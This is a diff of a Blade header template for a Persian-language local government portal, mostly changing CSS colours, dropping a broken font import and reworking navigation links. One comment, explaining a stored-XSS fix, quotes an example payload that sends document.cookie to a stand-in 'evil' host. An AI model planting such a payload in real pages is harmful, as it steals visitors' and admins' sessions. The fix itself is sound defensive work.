@@ -62,7 +62,7 @@
 <style>
     /* ==================== نوار بالا ==================== */
     .gov-topbar {
-        background: linear-gradient(90deg, #0d3b2e 0%, #103d68 50%, #0d3b2e 100%);
+        background: linear-gradient(90deg, #0d3b2e 0%, #14432f 50%, #0d3b2e 100%);
         color: white;
         padding: 8px 0;
         font-size: 13px;
@@ -165,7 +165,7 @@
 
     /* ==================== منوی ناوبری ==================== */
     .gov-navbar {
-        background: linear-gradient(90deg, #0d3b2e 0%, #103d68 100%);
+        background: linear-gradient(90deg, #0d3b2e 0%, #14432f 100%);
         border-top: 1px solid rgba(255,213,79,0.3);
         position: relative;
         z-index: 5;
@@ -310,7 +310,7 @@
     }
 
     .gov-consensus-banner {
-        background: linear-gradient(90deg, #0d3b2e 0%, #1a4a7a 30%, #10b981 50%, #1a4a7a 70%, #0d3b2e 100%);
+        background: linear-gradient(90deg, #0d3b2e 0%, #14432f 30%, #10b981 50%, #14432f 70%, #0d3b2e 100%);
         color: white;
         padding: 12px 20px;
         text-align: center;
@@ -778,14 +778,12 @@ button, a, input[type="submit"] {
     
     
 
-    /* ============ فونت ایران نستعلیق برای عنوان ============ */
-    @font-face {
-        src: url('https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css');
-        font-display: swap;
-    }
-
-    /* فونت نستعلیق از CDN */
-    @import url('https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css');
+    /* ============ فونت — به‌صورت محلی از css/persian-fonts.css ============
+       توجه: قبلاً اینجا یک @font-face ناقص (بدون font-family و با src
+       به یک فایل CSS) و یک @import به jsDelivr وجود داشت. آن @font-face
+       هیچ‌کاری نمی‌کرد و @import هم بعد از قوانین دیگر قرار داشت که طبق
+       استاندارد CSS نامعتبر است و مرورگر نادیده می‌گرفت. هر دو حذف شدند
+       و فونت وزیرمتن اکنون از دامنه‌ی خود سایت لود می‌شود. */
 
     /* عنوان اصلی با فونت نستعلیق */
     .gov-main-title,
@@ -1485,7 +1483,7 @@ img, iframe, video {
     .gov-sub-title,
     .gv-sub-title,
     .s-titles p {
-        color: #e8f0fa !important;
+        color: #e8f5e9 !important;
         text-shadow: 0 2px 5px rgba(13, 46, 79, 0.7) !important;
     }
 
@@ -1506,7 +1504,7 @@ img, iframe, video {
 
     /* ۴. نوار منو — آبی متوسط با خط طلایی */
     .gov-navbar {
-        background: linear-gradient(90deg, #14497f 0%, #065f46 100%) !important;
+        background: linear-gradient(90deg, #1b5e20 0%, #065f46 100%) !important;
         border-top: 3px solid #ffd54f !important;
         box-shadow: 0 4px 14px rgba(13, 46, 79, 0.2) !important;
     }
@@ -1541,13 +1539,13 @@ img, iframe, video {
 
     .gov-action-btn:hover {
         background: #ffd54f !important;
-        color: #14497f !important;
+        color: #1b5e20 !important;
         transform: none !important;
     }
 
     /* ۶. نوار دولت وفاق ملی — آبی روشن */
     .gov-consensus-banner {
-        background: linear-gradient(90deg, #14497f 0%, #10b981 50%, #14497f 100%) !important;
+        background: linear-gradient(90deg, #1b5e20 0%, #10b981 50%, #1b5e20 100%) !important;
         border-bottom: 2px solid #ffd54f !important;
         box-shadow: 0 3px 10px rgba(13, 46, 79, 0.15) !important;
     }
@@ -1605,11 +1603,11 @@ img, iframe, video {
 
     /* ═══ متن عادی → سرمه‌ای روشن‌تر ═══ */
     body {
-        color: #1a3a5c;
+        color: #14432f;
     }
 
     p, li, span, div {
-        color: #1a3a5c;
+        color: #14432f;
     }
 
     /* ═══ لینک‌ها → آبی متوسط ═══ */
@@ -1626,7 +1624,7 @@ img, iframe, video {
         font-weight: 700;
     }
     .info-item .value {
-        color: #1a3a5c !important;
+        color: #14432f !important;
     }
 
     /* ═══ عنوان کارت‌های اخبار / پروژه / شورا ═══ */
@@ -1641,7 +1639,7 @@ img, iframe, video {
     /* ═══ عنوان اخبار بخشداری ═══ */
     .news-list-item h4 a,
     .news-list-item h4 {
-        color: #10b981 !important;
+        color: #333333 !important;
     }
     .news-list-item h4 a:hover {
         color: #c62828 !important;
@@ -1717,7 +1715,7 @@ img, iframe, video {
     .gov-sub-title,
     .gv-sub-title,
     .s-titles p {
-        color: #1a3a5c !important;
+        color: #14432f !important;
         text-shadow:
             0 1px 4px rgba(255, 255, 255, 0.8),
             0 1px 2px rgba(0, 0, 0, 0.25) !important;
@@ -1806,7 +1804,7 @@ img, iframe, video {
     .gov-nav-details-menu a {
         display: block;
         padding: 11px 18px;
-        color: #1a3a5c !important;
+        color: #14432f !important;
         text-decoration: none;
         font-size: 13.5px;
         font-weight: 600;
@@ -1815,7 +1813,7 @@ img, iframe, video {
         transition: all .15s;
     }
     .gov-nav-details-menu a:hover {
-        background: #f0f7ff;
+        background: #f1f8e9;
         color: #c62828 !important;
         border-right-color: #c62828;
     }
@@ -1895,12 +1893,27 @@ img, iframe, video {
             </div>
             <div class="gov-titles">
                 <h1 class="gov-main-title">@php
-    $__t = $headerTitle ?? 'پایگاه اطلاع‌رسانی بخش‌های شهرستان چگنی';
+    /*
+     * ⚠️ امنیت — رفع XSS ذخیره‌شده
+     *
+     * نام روستا و بخش توسط ادمین قابل ویرایش است و اعتبارسنجی آن فقط
+     * «رشته، حداکثر ۲۵۵ کاراکتر» است. قبلاً این متن بدون escape داخل
+     * {!! !!} چاپ می‌شد؛ یعنی اگر ادمین یک روستا نامش را چنین می‌گذاشت:
+     *     <img src=x onerror="fetch('//evil/?c='+document.cookie)">
+     * آن اسکریپت روی مرورگر «هر بازدیدکننده» و «هر ادمینی» که سایت را
+     * می‌دید اجرا می‌شد (دزدیدن نشست، تغییر ظاهر سایت).
+     *
+     * الان عنوان و نام‌ها با e() escape می‌شوند و تنها HTML مجاز،
+     * همان تگ <span> است که خودمان می‌سازیم.
+     */
+    $__t = e($headerTitle ?? 'پایگاه اطلاع‌رسانی بخش‌های شهرستان چگنی');
+
     $__names = [];
-    if (isset($section) && $section->name) $__names[] = $section->name;
-    if (isset($village) && $village->name) $__names[] = $village->name;
+    if (isset($section) && $section->name) $__names[] = e($section->name);
+    if (isset($village) && $village->name) $__names[] = e($village->name);
+
     foreach ($__names as $__n) {
-        if (empty($__n)) continue;
+        if ($__n === '') continue;
         $__t = str_replace($__n, '<span style="-webkit-text-fill-color:#D32F2F !important;color:#D32F2F !important;font-weight:900 !important;font-size:1.4em !important;display:inline-block !important;padding:0 8px !important;text-shadow:0 2px 6px rgba(211,47,47,0.3) !important;border-bottom:3px solid #D32F2F !important;line-height:1.2 !important">' . $__n . '</span>', $__t);
     }
 @endphp
@@ -1983,7 +1996,30 @@ img, iframe, video {
             
         @endif
         <a href="{{ route('search.index') }}" class="gov-nav-item">🔍 جستجو</a>
-        @if(isset($section) && ($section->bakhshdar_name ?? false))
+        @php
+            /* ── تشخیص زمینه‌ی صفحه ──
+               فقط اگر واقعاً در صفحه‌ی یک روستا باشیم، «معرفی دهیار»
+               نمایش داده می‌شود. (متغیرهای $village/$section ممکن است از
+               حلقه‌های صفحه به این پارشال نشت کنند، پس به مسیر تکیه می‌کنیم.) */
+            $__hdrIsVillage = request()->routeIs('public.village.show')
+                || request()->routeIs('village.site.*')
+                || request()->routeIs('village.tariff.*');
+
+            $__hdrVillageSlug = null;
+            if ($__hdrIsVillage) {
+                $__hdrVillageSlug = request()->route('slug')
+                    ?: (isset($village) && is_object($village) ? ($village->slug ?? null) : null);
+            }
+
+            $__hdrIsSection = app()->bound('currentSection')
+                || request()->routeIs('section.*');
+        @endphp
+        @if($__hdrVillageSlug)
+            <a href="{{ route('village.site.dehyar', $__hdrVillageSlug) }}"
+               class="gov-nav-item {{ request()->routeIs('village.site.dehyar') ? 'active' : '' }}">👤 معرفی دهیار</a>
+            <a href="{{ route('village.site.council', $__hdrVillageSlug) }}"
+               class="gov-nav-item {{ request()->routeIs('village.site.council') ? 'active' : '' }}">👥 شورای روستا</a>
+        @elseif($__hdrIsSection && isset($section) && ($section->bakhshdar_name ?? false))
             <a href="/bakhshdar" class="gov-nav-item {{ str_contains(request()->path(), 'bakhshdar') ? 'active' : '' }}">👤 معرفی بخشدار</a> {{-- menu-moved-2026 --}}
             <a href="/council" class="gov-nav-item {{ str_contains(request()->path(), 'council') ? 'active' : '' }}">👥 شورای بخش</a>
         @endif
